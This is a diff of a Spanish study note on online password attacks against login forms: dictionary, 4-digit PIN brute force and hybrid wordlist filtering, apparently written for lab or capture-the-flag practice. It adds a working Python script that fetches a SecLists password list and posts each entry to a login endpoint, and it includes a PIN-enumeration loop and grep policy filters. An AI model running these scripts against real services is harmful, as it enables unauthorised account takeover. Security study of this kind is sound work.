@@ -8,8 +8,6 @@ Nota previa: "[[00 - Introducción al brute forcing]]"
 Nota siguiente: "[[02 - Hydra]]"
 Area: "[[Brute Forcing.base|Brute Forcing]]"
 ---
----
-
 La [[00 - Introducción al brute forcing|taxonomía conceptual]] se traduce en tres técnicas que de verdad usas contra un login: **diccionario** (el caballo de batalla), **híbrido** (diccionario mutado) y **máscara** (brute force acotado a un patrón). La fuerza bruta exhaustiva pura queda relegada a keyspaces diminutos.
 
 # Diccionario: la técnica de cabecera
@@ -18,28 +16,50 @@ La [[00 - Introducción al brute forcing|taxonomía conceptual]] se traduce en t
 
 Wordlists de referencia para login web (vienen en Kali/Parrot o se sacan de [SecLists](https://github.com/danielmiessler/SecLists)):
 
-| Wordlist | Contenido | Uso |
-| - | - | - |
-| `rockyou.txt` | ~14M de contraseñas de la brecha de RockYou | El diccionario por defecto |
-| `2023-200_most_used_passwords.txt` | Top 200 reutilizadas | Primer barrido rápido y sigiloso |
-| `darkweb2017_top-10000.txt` | Top 10k de filtraciones | Equilibrio cobertura/velocidad |
-| `top-usernames-shortlist.txt` | Usuarios más comunes | Fase de [[01 - Enumeración de usuarios|enum de usuarios]] |
-| `Default-Credentials/default-passwords.txt` | `user:pass` de fábrica | [[06 - Credenciales por defecto|Credenciales por defecto]] |
+| Wordlist                                    | Contenido                                   | Uso                                      |
+| ------------------------------------------- | ------------------------------------------- | ---------------------------------------- |
+| `rockyou.txt`                               | ~14M de contraseñas de la brecha de RockYou | El diccionario por defecto               |
+| `2023-200_most_used_passwords.txt`          | Top 200 reutilizadas                        | Primer barrido rápido y sigiloso         |
+| `darkweb2017_top-10000.txt`                 | Top 10k de filtraciones                     | Equilibrio cobertura/velocidad           |
+| `top-usernames-shortlist.txt`               | Usuarios más comunes                        | Fase de [[01 - Enumeración de usuarios]] |
+| `Default-Credentials/default-passwords.txt` | `user:pass` de fábrica                      | [[06 - Credenciales por defecto]]        |
 
 <mark style="background: #FF5582A6;">La wordlist genérica es el plan B; la que de verdad rompe cuentas es la dirigida.</mark> En un engagement, construyes la lista con lo recolectado en [[00 - Reconocimiento web|recon]]: nombre de la empresa y variantes, nombres de empleados, jerga del sector, año en curso. Eso se cubre en [[04 - Generación de wordlists]].
+
+También está la posibilidad de usar <mark style="background: #FFB86CA6;">`Python` para lanzar el ataque de fuerza bruta</mark> usando una *wordlist*:
+```Python
+import requests 
+ip = "127.0.0.1" 
+port = 1234
+
+passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
+
+# Intentar cada contraseña de la lista
+for password in passwords: 
+	print(f"Attempted password: {password}") 
+	
+	# Enviar una solictud de POST al servidor
+	response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password}) 
+	
+	# Comprobar si el servidor responde con status OK y si contiene la flag
+	if response.ok and 'flag' in response.json(): 
+		print(f"Correct password found: {password}") 
+		print(f"Flag: {response.json()['flag']}") 
+		break
+```
 
 # Fuerza bruta pura: solo con keyspace diminuto
 
 Recorrer todo el espacio `online` solo es viable cuando es minúsculo. El caso típico: un **PIN de 4 dígitos** (10.000 combinaciones) o un código OTP. Un script trivial lo agota en segundos:
-
 ```python
 import requests
 
 for pin in range(10000):
-    p = f"{pin:04d}"                       # 0000 → 9999, con ceros a la izquierda
+    p = f"{pin:04d}"        # 0000 → 9999, con ceros a la izquierda
     r = requests.get(f"http://{ip}:{port}/pin?pin={p}")
     if r.ok and 'flag' in r.json():
-        print(f"PIN: {p} → {r.json()['flag']}"); break
+        print(f"PIN: {p} → {r.json()['flag']}")
+        break
 ```
 
 <mark style="background: #FFB8EBA6;">El mismo principio sostiene el [[04 - Fuerza bruta de códigos 2FA y MFA|brute force de códigos 2FA]]</mark>: 6 dígitos son solo un millón de combinaciones, crackeables en minutos **si** no hay rate limiting. La defensa aquí nunca es la longitud, sino el límite de intentos.
@@ -47,8 +67,7 @@ for pin in range(10000):
 # Híbrido: diccionario + mutación
 
 Las políticas de cambio periódico de contraseña generan un patrón explotable: el usuario "decora" su contraseña anterior en vez de cambiarla. `Summer2023` se convierte en `Summer2023!` o `Summer2024`.
-
-![Diagrama: la contraseña original Summer2023 mutada a Summer2023! y Summer2024 añadiendo símbolo o incrementando el año.](https://academy.hackthebox.com/storage/modules/57/2n.png)
+![[Modificar_Contraseña.webp]]
 
 <mark style="background: #FFB86CA6;">El `hybrid attack` captura esas variantes</mark>: parte del diccionario y le aplica mutaciones (sufijos, `leet`, años). Hay dos formas de generarlas.
 
@@ -59,8 +78,13 @@ $ grep -E '^.{8,}$' darkweb2017_top-10000.txt | grep -E '[A-Z]' | grep -E '[a-z]
 $ wc -l policy.txt
 89 policy.txt
 ```
+Respecto al `regex`: 
+- La expresión regular `^.{8,}$` actúa como un filtro, asegurando que <mark style="background: #FFB8EBA6;">solo las contraseñas que contienen al menos 8 caracteres</mark> pasen.
+- La expresión regular `[A-Z]` asegura que <mark style="background: #FFB8EBA6;">cualquier contraseña que no tenga una letra mayúscula sea descartada</mark>.
+- La expresión regular `[a-z]` sirve como filtro, <mark style="background: #FFB8EBA6;">conservando solo las contraseñas que incluyen al menos una letra minúscula</mark>.
+- La expresión regular `[0-9]` actúa como filtro, asegurando que las <mark style="background: #FFB8EBA6;">contraseñas que contienen al menos un dígito numérico se conserven</mark>.
 
-De 10.000 a 89 candidatas: un ataque mucho más rápido y enfocado.
+De 10.000 a 89 candidatas: un <mark style="background: #FF5582A6;">ataque mucho más rápido y enfocado</mark>.
 
 **La forma moderna — reglas de mutación.** Encadenar `grep` filtra, pero no **genera** variantes nuevas. Para eso, el estándar son las reglas de `hashcat`/`John`, que mutan cada palabra (capitalizar, añadir años, `leet`...) y se pueden volcar a stdout para alimentar a un cracker `online` como [[02 - Hydra|Hydra]] o [[03 - Medusa y alternativas modernas|ffuf]]:
 
